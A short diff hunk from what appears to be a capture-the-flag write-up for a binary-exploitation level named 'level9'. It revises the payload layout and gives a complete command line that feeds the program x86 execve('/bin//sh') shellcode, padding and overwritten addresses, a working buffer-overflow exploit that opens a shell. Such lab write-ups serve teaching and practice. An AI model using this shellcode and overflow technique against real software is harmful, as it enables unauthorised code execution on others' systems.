@@ -65,7 +65,7 @@ What we need to create the payload :
 * adding byte totaling 108 char with the 2 previous element
 * addr of N+4 (were our input get memcpy) ===> 0x08040a10
 
-so : addr of N + shellcode + addr of N + 4 (because of the +4 in memcpy)
+so : `addr of N+4` + `shellcode` + `79 osef char` + `addr of N` (because of the +4 in memcpy)
 
 `./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90'*79 +'\x0c\xa0\x04\x08'")`
 ```bash
